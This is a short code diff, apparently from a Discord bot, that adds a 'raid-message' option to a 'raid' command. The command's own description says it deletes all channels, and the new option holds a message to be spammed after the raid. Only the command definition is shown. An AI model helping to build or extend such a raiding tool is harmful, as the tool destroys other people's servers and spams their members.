@@ -8,8 +8,15 @@ const commands = [
     },
     {
       name: 'raid',
-      description: "deletes all channels."
-    }
+      description: "deletes all channels.",
+      options : [
+        {
+        name: "raid-message",
+        description: 'message that should be spammed afer raid.',
+        type: ApplicationCommandOptionType.String,
+      }
+    ]
+    },
  
 ];
 
